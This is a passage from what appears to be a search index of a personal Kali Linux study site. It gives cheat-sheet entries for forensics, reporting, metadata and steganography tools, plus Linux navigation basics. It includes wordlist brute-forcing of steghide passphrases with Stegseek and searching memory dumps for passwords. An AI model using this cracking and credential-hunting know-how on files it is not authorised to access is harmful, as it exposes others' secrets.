file_recovered</code> \u2192 extract file content by inode.  </li> <li><code>tsk_recover image.dd output_dir/</code> \u2192 recover many files.  </li> <li>Most commands require specifying the offset for embedded filesystems (<code>-o &lt;offset&gt;</code>), where offset is usually from <code>mmls</code> output (in sectors).</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Show partition layout\n$ mmls image.dd\n# Output snippet:\n# DOS Partition Table\n# Offset Sector: 0\n# Slot  Start      End        Length      Description\n# 0:    2048        209919     207872      Linux\n\n# List files including deleted (-r recursive)\n$ fls -r -m / image.dd\n# Output snippet:\n# r/r  1234:  file.txt\n# d/d  1235:  deleted.txt\n\n# Extract a file by inode\n$ icat image.dd 1234 &gt; recovered_file.txt\n# recovered_file.txt now contains the file content\n\n# Recover all files\n$ tsk_recover image.dd recovered_files/\n# Recovered X files to recovered_files/\n</code></pre> <p>Sleuthkit Basics</p> <ul> <li>Use <code>mmls</code> first to get partition offsets; pass <code>-o &lt;offset&gt;</code> to tools when necessary.</li> <li><code>fls</code> shows deleted entries (prefixed with <code>r</code>/<code>d</code> markers).</li> <li><code>icat</code> extracts file contents by inode; useful when filenames are gone.</li> <li>Work on copies of images \u2014 never write back to original evidence files.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#sleuthkit-commands","title":"Sleuthkit Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/","title":"Volatility","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#official-documentation-httpsvolatilityfoundationorg","title":"Official Documentation: https://volatilityfoundation.org/","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#cheat-sheet-volatility-commands","title":"Cheat Sheet: Volatility Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#purpose","title":"Purpose","text":"<p>Volatility is a memory forensics framework used to analyze RAM captures for processes, network connections, loaded DLLs, command history, and other volatile artifacts.</p>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Analyze a memory dump from a challenge VM to find strings, hidden processes, or credentials in memory.  </li> <li>Real world: Investigate live incidents by analyzing memory captures for malware processes, injected code, or active network sessions.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Use either Volatility 2 (classic, many plugins) or Volatility 3 (actively developed). Install via package manager or pip in a virtualenv.  </li> <li>Input: memory image (raw <code>memory.dmp</code>, <code>lime</code>, <code>aff4</code>, etc.). Determine profile/OS (Volatility 2) or use auto-detection (Vol3).  </li> <li>Common Volatility 2 commands:</li> <li><code>vol.py -f mem.img --profile=LinuxUbuntu_... pslist</code> \u2192 list processes  </li> <li><code>vol.py -f mem.img --profile=... netscan</code> \u2192 show network connections (plugins vary by OS)  </li> <li><code>vol.py -f mem.img --profile=... strings</code> \u2192 search strings  </li> <li><code>vol.py -f mem.img --profile=... dumpfiles -D out/ -Q &lt;offset&gt;</code> \u2192 dump file-like objects</li> <li>Common Volatility 3 usage:</li> <li><code>vol -f mem.img windows.pslist</code> or <code>vol -f mem.img linux.pslist</code> (plugin names differ)  </li> <li><code>vol -f mem.img windows.dlllist</code> \u2192 list loaded DLLs  </li> <li><code>vol -f mem.img linux.lsof</code> \u2192 list open files/sockets</li> <li>Some plugins need debug symbols or extra requirements; check plugin docs.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Volatility 2 example (Windows-like)\n$ vol.py -f memory.dmp --profile=Win7SP1x64 pslist\n# Output:\n# Offset(P)          Name                    PID   PPID   Thds   Hnds   Time\n# 0x1a2b3c4d0        explorer.exe            1234  1000   35     800    2025-09-01 12:00:00\n\n# Volatility 3 example\n$ vol -f memory.raw linux.pslist\n# Output:\n# PID   PPID   NAME\n# 1     0      systemd\n# 1234  1      bash\n\n# Search for strings containing \"password\"\n$ strings memory.raw | grep -i password || true\n# output: \"db_password=secret123\"\n\n# Dump a process memory region (Vol3 example)\n$ vol -f memory.raw linux.dumpfiles --output-directory=out --pids=1234\n# Output: files dumped to out/\n</code></pre> <p>Volatility Basics</p> <ul> <li>Choose Volatility 2 or 3 based on plugin support for the OS/image; Vol3 is actively developed but plugin names differ.</li> <li>Use <code>file</code> and <code>strings</code> as quick checks, then run <code>pslist</code>/<code>psscan</code> and <code>netscan</code>/<code>lsof</code> to find suspicious processes and connections.</li> <li>Memory analysis can reveal credentials, injected shells, and in-memory-only artifacts not on disk.</li> <li>Work on copies of memory captures and document each step for reproducibility.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Volatility/#volatility-commands","title":"Volatility Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/","title":"Dradis","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#official-documentation-httpsdradiscom","title":"Official Documentation: https://dradis.com/","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#cheat-sheet-dradis-commands","title":"Cheat Sheet: Dradis Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#purpose","title":"Purpose","text":"<p>Dradis is a collaboration and reporting platform for security assessments. It centralizes findings from scans and manual testing, lets teams share notes, and generates consistent reports (HTML/PDF).</p>"},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Keep track of discovered vulnerabilities, PoCs, and flags when working in a team.  </li> <li>Real world: Consolidate outputs from Nmap, Burp, Nikto, etc., assign issues to teammates, and produce professional reports for clients.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Installation: available as package/docker or via source (<code>apt</code>, Docker image <code>dradis/dradis-ce</code>).  </li> <li>Basic workflow:</li> <li>Start server (e.g., <code>docker run -p 3000:3000 dradis/dradis-ce</code>) or system service.  </li> <li>Login via web UI (default port 3000).  </li> <li>Create a project/case, import findings (CSV, XML, JSON, Nessus, Nmap), or add manual notes.  </li> <li>Organize issues, set severity, add remediation text, and assign owners.  </li> <li>Export templates: HTML, PDF, Markdown.  </li> <li>Integrations: many scanners (Nessus, Burp, Nikto), plugins for automation.  </li> <li>Permissions: set user roles (admin, contributor, viewer).</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Quick Docker run (community edition)\n$ docker run --rm -p 3000:3000 dradis/dradis-ce\n# Output:\n# Listening on http://0.0.0.0:3000\n# Visit http://localhost:3000 to login and create a project\n\n# Import an Nmap XML from the UI: Project -&gt; Import -&gt; Nmap (upload file)\n# Add manual note in the web UI: Findings -&gt; Add Finding -&gt; set severity/notes\n# Export: Project -&gt; Export -&gt; choose template (HTML/PDF)\n</code></pre> <p>Dradis Basics</p> <ul> <li>Dradis is web/UI-first \u2014 run the server (Docker or package) and use the browser to manage projects.</li> <li>Import scanner outputs (Nmap, Nessus, Burp) to avoid manual re-entry.</li> <li>Use report templates to standardize client deliverables.</li> <li>Set user roles and backups for team work; never run production data without access controls.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Dradis/#dradis-commands","title":"Dradis Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/","title":"Faraday","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#official-documentation-httpsfaradayseccompenetration-testing-reporting","title":"Official Documentation: https://faradaysec.com/penetration-testing-reporting/","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#cheat-sheet-faraday-commands","title":"Cheat Sheet: Faraday Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#purpose","title":"Purpose","text":"<p>Faraday is a collaborative penetration testing IDE that centralizes results, provides issue tracking, and integrates many security tools for team workflows.</p>"},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Share discoveries and scan outputs with teammates in real time to divide tasks and avoid duplication.  </li> <li>Real world: Centralize scan results (Nmap, Nikto, SQLmap), annotate findings, track remediation status, and generate reports.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Deployment: Faraday Server + Client (Docker images available) or package installs. Typical ports: 5985 (API/UI) depending on version.  </li> <li>Basic workflow:</li> <li>Start Faraday server and web UI (or use docker-compose).  </li> <li>Create workspace and invite team members.  </li> <li>Import scan outputs (Nmap, Nessus, Burp, OpenVAS) via UI or CLI importer.  </li> <li>Tag findings, add notes, and link evidence (screenshots, pcap).  </li> <li>Export reports (CSV, HTML) or integrate with issue trackers (Jira).  </li> <li>CLI import examples: <code>faraday_importer -i nmap.xml -w workspace_name</code> (actual CLI depends on installed package/version).  </li> <li>Integrations: many scanners, issue trackers, and CI pipelines.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Example docker-compose quickstart (depends on version)\n$ docker-compose up -d\n# Output: starts faraday-server, faraday-client containers, UI accessible at configured port\n\n# Import an Nmap XML from server CLI (example helper)\n$ faraday-import nmap -f nmap.xml -w myworkspace\n# Output:\n# Imported 12 hosts and 34 services into workspace \"myworkspace\"\n\n# Use web UI: open server URL, select workspace, view hosts/services, add issues and notes\n# Export CSV/HTML from the Export menu\n</code></pre> <p>Faraday Basics</p> <ul> <li>Faraday centralizes many tool outputs \u2014 import scanner XMLs to build a single source of truth.</li> <li>Use workspaces per engagement and control user permissions for collaboration.</li> <li>Integrates with trackers (Jira) and CI for automated workflows.</li> <li>CLI import helper names may vary by version \u2014 check <code>faraday --help</code> or package docs.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Faraday/#faraday-commands","title":"Faraday Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/","title":"Maltego","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#official-documentation-httpsdocsmaltegocomensupportsolutionsarticles15000059016-reports","title":"Official Documentation: https://docs.maltego.com/en/support/solutions/articles/15000059016-reports","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#cheat-sheet-maltego-commands","title":"Cheat Sheet: Maltego Commands","text":""},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#purpose","title":"Purpose","text":"<p>Maltego is a visual link-analysis tool for OSINT and relationship mapping. It transforms data (domains, emails, IPs) into graphs showing connections and attributes.</p>"},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Map entities (domains, subdomains, email addresses) to find relationships or pivot points for further recon.  </li> <li>Real world: Conduct OSINT investigations, map infrastructure, and visualize attacker infrastructure or social links.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Maltego TRx (Community, Classic, XL) GUI available; install from Paterva.  </li> <li>Transforms: built-in and remote transforms (WHOIS, DNS, Shodan, social media) \u2014 many require API keys.  </li> <li>Basic workflow:</li> <li>Start Maltego GUI.  </li> <li>Create a graph and add seed entities (domain, email, IP).  </li> <li>Run transforms to expand nodes (DNS transforms, WHOIS, subdomain finders).  </li> <li>Use filters/visual styles to focus on high-signal nodes and export graphs (PNG, CSV).  </li> <li>Transform hubs: community transforms and paid transform servers increase capabilities.  </li> <li>API keys: register for keys (Shodan, VirusTotal, etc.) to unlock transforms.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># GUI flow (no terminal output):\n# 1. New Graph -&gt; Add Entity: \"example.com\"\n# 2. Right-click entity -&gt; Run Transform -&gt; DNS from Domain -&gt; finds subdomains\n# 3. Expand nodes: run WHOIS and DNS transforms to get registrar/name servers\n# 4. Visual graph shows connections; export via File -&gt; Export -&gt; PNG/CSV\n\n# Example transform result:\n# example.com -&gt; mail.example.com (MX) -&gt; 192.0.2.1 (A record) -&gt; AS12345 (owner)\n</code></pre> <p>Maltego Basics</p> <ul> <li>Maltego is GUI/visual-first \u2014 use transforms to pivot from a seed entity into a graph.</li> <li>Many useful transforms need API keys (Shodan, VirusTotal) \u2014 add keys in settings for full power.</li> <li>Use filtering and grouping to manage large graphs and focus on high-value nodes.</li> <li>Respect privacy and legal limits when performing OSINT \u2014 always follow terms of service.</li> </ul>"},{"location":"Kali%20Tools/11%20-%20Reporting/Maltego/#maltego-commands","title":"Maltego Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/","title":"Exiftool","text":""},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#official-documentation-httpsexiftoolorgexiftool_podhtml","title":"Official Documentation: https://exiftool.org/exiftool_pod.html","text":""},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#cheat-sheet-exiftool-commands","title":"Cheat Sheet: Exiftool Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#purpose","title":"Purpose","text":"<p>ExifTool reads and writes metadata from many file types (images, audio, documents). It's the go-to tool to find hidden metadata like camera model, timestamps, comments, and sometimes user-added strings.</p>"},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Inspect an image submission for hidden metadata (comments, GPS, user fields) that may contain a flag.  </li> <li>Real world: Check files for leaked sensitive metadata (GPS coordinates in images, author names in documents) during investigations.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Install: <code>apt install libimage-exiftool-perl</code> (package name) or <code>exiftool</code> binary.  </li> <li>Basic flags:</li> <li><code>exiftool &lt;file&gt;</code> \u2192 show all metadata  </li> <li><code>exiftool -a -u -g1 &lt;file&gt;</code> \u2192 show all tags, unknown tags, grouped by family 1  </li> <li><code>exiftool -list</code> \u2192 list supported tags  </li> <li><code>exiftool -TAG=&lt;value&gt; &lt;file&gt;</code> \u2192 write/edit tag (be careful; keep copies)  </li> <li><code>exiftool -csv -all &lt;file&gt;</code> \u2192 export metadata as CSV  </li> <li>Works on images (<code>.jpg/.png</code>), PDFs, Office docs, audio, etc.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Show metadata for an image\n$ exiftool photo.jpg\n# Output snippet:\n# File Name                       : photo.jpg\n# Camera Model Name               : Canon EOS 80D\n# Create Date                     : 2024:05:21 14:33:10\n# GPS Longitude                   : -73.935242\n# Artist                          : alice@example.com\n# Comment                         : flag{example_flag_here}\n\n# Show full tag groups and unknowns\n$ exiftool -a -u -g1 photo.jpg\n# Output shows tags grouped (EXIF, XMP, IPTC) including any weird custom fields\n\n# Export metadata to CSV\n$ exiftool -csv image.jpg &gt; metadata.csv\n</code></pre> <p>ExifTool Basics</p> <ul> <li><code>exiftool &lt;file&gt;</code> shows most tags; use <code>-a -u -g1</code> to reveal all tags including unknown/custom ones.</li> <li>Metadata may include sensitive info (GPS, emails, comments); check images, docs, and office files.</li> <li>Avoid writing edits to originals; make a copy before using write flags.</li> <li>Use <code>exiftool -csv</code> to export results for easy searching or reporting.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Exiftool/#exiftool-commands","title":"Exiftool Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Steghide/","title":"Steghide","text":""},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#official-documentation-httpssteghidesourceforgenet","title":"Official Documentation: https://steghide.sourceforge.net/","text":""},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#cheat-sheet-steghide-commands","title":"Cheat Sheet: Steghide Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#purpose","title":"Purpose","text":"<p>Steghide hides and extracts data in image (JPEG, BMP) and audio (WAV) files using passphrase-based steganography. Use it to hide a small file inside an image or reveal hidden content if you know (or brute-force) the passphrase.</p>"},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Extract a hidden file from an image when the challenge says \"stego\" or provides a suspicious image.  </li> <li>Real world: Demonstrate risks of hidden content in media during an assessment or extract hidden artifacts in incident response.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Install: <code>apt install steghide</code>.  </li> <li>Basic commands:</li> <li><code>steghide embed -cf cover.jpg -ef secret.txt -sf out.jpg</code> \u2192 embed <code>secret.txt</code> into <code>out.jpg</code> (prompts for passphrase)  </li> <li><code>steghide extract -sf out.jpg -xf secret.txt</code> \u2192 extract <code>secret.txt</code> from <code>out.jpg</code> (prompts for passphrase)  </li> <li><code>steghide info &lt;file&gt;</code> \u2192 show if file contains embedded data (gives capacity info)  </li> <li>Passphrase required to extract; if unknown, use wordlists to brute-force (external wrappers/scripts help).</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Check if an image has steghide data\n$ steghide info suspicious.jpg\n# Output snippet:\n# steghide v0.5.1\n# \"suspicious.jpg\":\n#  embedded file \"secret.txt\", size: 1234 bytes, \n#  method: aes-256, compressed: yes\n\n# Extract embedded file (will prompt for passphrase)\n$ steghide extract -sf suspicious.jpg -xf secret.txt\nEnter passphrase: ********\n# Output: wrote extracted data to \"secret.txt\"\n\n# Embed a file (will prompt for passphrase)\n$ steghide embed -cf cover.jpg -ef secret.txt -sf out.jpg\nEnter passphrase: ********\n# Output: embedding successful\n</code></pre> <p>Steghide Basics</p> <ul> <li><code>steghide info &lt;file&gt;</code> is your first check to see if data is embedded.</li> <li>Extraction requires the correct passphrase; if unknown, try context-derived wordlists from Cewl or common lists.</li> <li>Steghide supports compression + AES encryption \u2014 check method in <code>steghide info</code>.</li> <li>Don\u2019t overwrite originals when embedding; work on copies.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Steghide/#steghide-commands","title":"Steghide Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/","title":"Stegseek","text":""},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#official-documentation-httpsgithubcomrickdejagerstegseek","title":"Official Documentation: https://github.com/RickdeJager/stegseek","text":""},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#cheat-sheet-stegseek-commands","title":"Cheat Sheet: Stegseek Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#purpose","title":"Purpose","text":"<p>Stegseek is a tool to brute-force passphrases for files hidden with certain stego tools (notably steghide). It tries a wordlist to find the passphrase and extract embedded content.</p>"},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: When <code>steghide info</code> shows embedded data but you don\u2019t know the passphrase, use Stegseek with a wordlist to try common passwords.  </li> <li>Real world: Recover hidden data when passphrase is weak and known-list attack is permitted.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Install: <code>apt install stegseek</code> (or get from repo). Some versions are Python wrappers \u2014 check <code>--help</code>.  </li> <li>Syntax: <code>stegseek &lt;stego-file&gt; &lt;wordlist&gt; &lt;output-file&gt;</code> (varies slightly by install).  </li> <li>Wordlists: use <code>rockyou.txt</code>, Cewl-generated lists, or targeted wordlists.  </li> <li>Speed depends on wordlist size and stego algorithm; stegseek targets specific formats (e.g., steghide).</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Run stegseek with rockyou to try and extract data from image\n$ stegseek suspicious.jpg /usr/share/wordlists/rockyou.txt extracted_output\n# Output snippet:\n# Trying password: 123456\n# Trying password: password\n# Password found: letmein\n# Extracted to extracted_output\n\n# If not found, stegseek will finish scanning the list and report no match\n</code></pre> <p>Stegseek Basics</p> <ul> <li>Stegseek automates a wordlist attack against stego passphrases \u2014 choose wordlists wisely (targeted &gt; huge).</li> <li>If stegseek fails, try custom lists from Cewl or context-specific words.</li> <li>Brute-forcing large lists is slow; prefer targeted lists first.</li> <li>Verify extracted output (file magic/type) after extraction to confirm success.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Stegseek/#stegseek-commands","title":"Stegseek Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Strings/","title":"Strings","text":""},{"location":"Kali%20Tools/12%20-%20Other/Strings/#official-documentation-httpsman7orglinuxman-pagesman1strings1html","title":"Official Documentation: https://man7.org/linux/man-pages/man1/strings.1.html","text":""},{"location":"Kali%20Tools/12%20-%20Other/Strings/#cheat-sheet-strings-commands","title":"Cheat Sheet: Strings Commands","text":""},{"location":"Kali%20Tools/12%20-%20Other/Strings/#purpose","title":"Purpose","text":"<p><code>strings</code> extracts printable character sequences from binary files. It's a fast first-pass tool to find hidden text, URLs, passwords, or flags inside executables, images, or memory dumps.</p>"},{"location":"Kali%20Tools/12%20-%20Other/Strings/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Quickly scan a binary, firmware image, or memory dump for obvious flags or credentials (<code>flag{...}</code>, URLs, API keys).  </li> <li>Real world: Triage binaries or memory captures to find plaintext secrets, hardcoded strings, or artifacts.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Strings/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li><code>strings</code> is part of <code>binutils</code> (installed by default on Kali).  </li> <li>Basic flags:</li> <li><code>strings &lt;file&gt;</code> \u2192 print printable strings (default min length 4)  </li> <li><code>strings -n &lt;length&gt; &lt;file&gt;</code> \u2192 set minimum string length (e.g., <code>-n 6</code>)  </li> <li><code>strings -a &lt;file&gt;</code> \u2192 scan the entire file (disabled by default for some builds)  </li> <li><code>strings -t x &lt;file&gt;</code> \u2192 show offset in hex before each string  </li> <li>Combine with <code>grep</code> to focus on patterns: <code>strings file | grep -i flag</code>.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Strings/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic strings scan\n$ strings firmware.bin | head -n 40\n# Output snippet:\n# /bin/sh\n# admin:password123\n# http://example.com/login\n# flag{example_flag_here}\n\n# Show offsets for strings (hex)\n$ strings -t x memory.raw | grep -i password\n# 1a2b3c password123\n\n# Increase min length to 6 to reduce noise\n$ strings -n 6 sample.bin | grep -i flag\n# flag{hidden_flag}\n</code></pre> <p>strings Basics</p> <ul> <li><code>strings</code> is a quick triage tool \u2014 it prints anything printable, so expect noise.</li> <li>Use <code>-n</code> to increase min-length and reduce false positives.</li> <li>Pipe into <code>grep</code> for targeted searches (<code>flag</code>, <code>password</code>, <code>http</code>).</li> <li>Great for scanning firmware, binaries, and memory dumps for quick leads.</li> </ul>"},{"location":"Kali%20Tools/12%20-%20Other/Strings/#strings-commands","title":"Strings Commands","text":""},{"location":"Linux%20Basics/00%20-%20Introduction/","title":"00   Introduction","text":""},{"location":"Linux%20Basics/00%20-%20Introduction/#official-documentation-httpswwwlinuxorg","title":"Official Documentation: https://www.linux.org/","text":""},{"location":"Linux%20Basics/00%20-%20Introduction/#purpose","title":"Purpose","text":"<p>The linux command line and other command lines and terminals can be used for a variety of things. The command line gives you the opportunity to search through directories, select specific files, run scripts, and a whole lot more all with just using commands. The command line allows for tasks to be executed quickly if you know what you're doing.</p>"},{"location":"Linux%20Basics/00%20-%20Introduction/#example","title":"Example","text":"<p><pre><code>\u2500\u2500(nick\u327fkali)-[~]\n\u2514\u2500$\n</code></pre> This is my Kali Linux default command line where I can enter a command after the $. The ~ shows that the command will run in my home directory.</p>"},{"location":"Linux%20Basics/01%20-%20File%20Navigation/","title":"01   File Navigation","text":""},{"location":"Linux%20Basics/01%20-%20File%20Navigation/#purpose","title":"Purpose","text":"<p>One of the most important skills to know inside the linux command line is how to navigate through the filesystem. This can be useful to show where you are, move to different directories to see whats inside, and more.</p>"},{"location":"Linux%20Basics/01%20-%20File%20Navigation/#core-commands","title":"Core Commands","text":"<pre><code>$ pwd \n/home/nick\n#Prints Directory You Are Currently In\n\n$ ls\nDesktop  Documents  Downloads  full_scan.txt  Music  Pictures  Public  Templates  Videos\n#Lists Non-Hidden Directory Contents\n\n$ ls -l\ntotal 36\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Desktop\ndrwxr-xr-x 2 nick nick 4096 Aug 28 21:09 Documents\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Downloads\n-rw-rw-r-- 1 nick nick  494 Aug 26 17:23 full_scan.txt\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Music\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Pictures\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Public\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Templates\ndrwxr-xr-x 2 nick nick 4096 Aug 25 15:04 Videos\n#Lists Non-Hidden Directory Contents With More Info\n\n$ cd &lt;directory name&gt;\n#Changes Your Current Directory To &lt;directory name&gt;\n\n$ cd ..\n#Changes Your Current Directory To The Directory Your Current Directory Is In (Moves Up A Level)\n\n$ cd ~\n#Changes Your Current Directory Back To Your Home Directory\n</code></pre> <p>Absolute vs Relative Paths</p> <ul> <li>Absolute Path disregards the current directory you are in, and you move to any specific path | <code>$ cd /home/nick/Downloads</code><ul> <li>must start with /</li> </ul> </li> <li>Relative Path takes into account what your current directory so you don't have to type the full path out. Lets say I'm in /home/nick and I want to get to Downloads | <code>$ cd Downloads</code> </li> </ul>"},{"location":"Linux%20Basics/01%20-%20File%20Navigation/#file-navigation-commands","title":"File Navigation Commands","text":""},{"location":"Linux%20Basics/02%20-%20Hidden%20Files/","title":"02   Hidden Files","text":""},{"location":"Linux%20Basics/02%20-%20Hidden%20Files/#purpose","title":"Purpose","text":"<p>Hidden files are files that start with a \".\". Being able to locate hidden files is useful in CTFs because a lot of times there are hidden files that contain useful information. In the real world hidden files are used for multiple things including pen testers hiding rootkits and malicious software, locating potential vulnerabilities, and more.</p>"},{"location":"Linux%20Basics/02%20-%20Hidden%20Files/#core-commands","title":"Core Commands","text":"<pre><code>$ ls -a \n.   .bash_logout  .bashrc.original  .config  .dmrc      Downloads  .face.icon     .gnupg         .java   .mozilla  Music     .profile  .ssh                       Templates  .Xauthority       .xsession-errors.old  .zsh_history\n..  .bashrc       .cache            Desktop  Documents  .face      full_scan.txt  .ICEauthority  .local  .msf4     Pictures  Public    .sudo_as_admin_successful  Videos     .xsession-errors  .zprofile             .zshrc\n#Prints All Files Including Hidden Files\n\n$ la -la\ntotal 160\ndrwx------ 18 nick nick  4096 Sep  2 23:31 .\ndrwxr-xr-x  3 root root  4096 Aug 25 14:57 ..\n-rw-r--r--  1 nick nick   220 Aug 25 14:57 .bash_logout\n-rw-r--r--  1 nick nick  5551 Aug 25 14:57 .bashrc\n-rw-r--r--  1 nick nick  3526 Aug 25 14:57 .bashrc.original\ndrwxrwxr-x 11 nick nick  4096 Aug 26 17:17 .cache\ndrwxr-xr-x 12 nick nick  4096 Aug 25 15:05 .config\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Desktop\n-rw-r--r--  1 nick nick    35 Aug 25 15:04 .dmrc\ndrwxr-xr-x  2 nick nick  4096 Aug 28 21:09 Documents\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Downloads\n-rw-r--r--  1 nick nick 11759 Aug 25 14:57 .face\nlrwxrwxrwx  1 nick nick     5 Aug 25 14:57 .face.icon -&gt; .face\n-rw-rw-r--  1 nick nick   494 Aug 26 17:23 full_scan.txt\ndrwx------  3 nick nick  4096 Aug 25 15:04 .gnupg\n-rw-------  1 nick nick     0 Aug 25 15:04 .ICEauthority\ndrwxr-xr-x  3 nick nick  4096 Aug 25 14:57 .java\ndrwxr-xr-x  5 nick nick  4096 Aug 25 15:04 .local\ndrwx------  4 nick nick  4096 Aug 25 18:07 .mozilla\ndrwxrwxr-x 12 nick nick  4096 Aug 25 15:39 .msf4\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Music\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Pictures\n-rw-r--r--  1 nick nick   807 Aug 25 14:57 .profile\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Public\ndrwx------  2 nick nick  4096 Aug 28 20:59 .ssh\n-rw-r--r--  1 nick nick     0 Aug 25 15:11 .sudo_as_admin_successful\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Templates\ndrwxr-xr-x  2 nick nick  4096 Aug 25 15:04 Videos\n-rw-------  1 nick nick    49 Aug 30 01:17 .Xauthority\n-rw-------  1 nick nick  9623 Sep  2 23:31 .xsession-errors\n-rw-------  1 nick nick  9520 Aug 29 13:53 .xsession-errors.old\n-rw-r--r--  1 nick nick   336 Aug 25 14:57 .zprofile\n-rw-------  1 nick nick  1503 Aug 30 02:48 .zsh_history\n-rw-r--r--  1 nick nick 10856 Aug 25 14:57 .zshrc\n#Prints All Files Including Hidden Files and More Info About Them\n</code></pre> <p>Hidden Files</p> <ul> <li>A lot of hidden files are usually just files that are automatically on every system, but for CTFs a lot of info can usually be found in the hidden files and checking them is a good start</li> </ul>"},{"location":"Linux%20Basics/02%20-%20Hidden%20Files/#hidden-files-commands","title":"Hidden Files 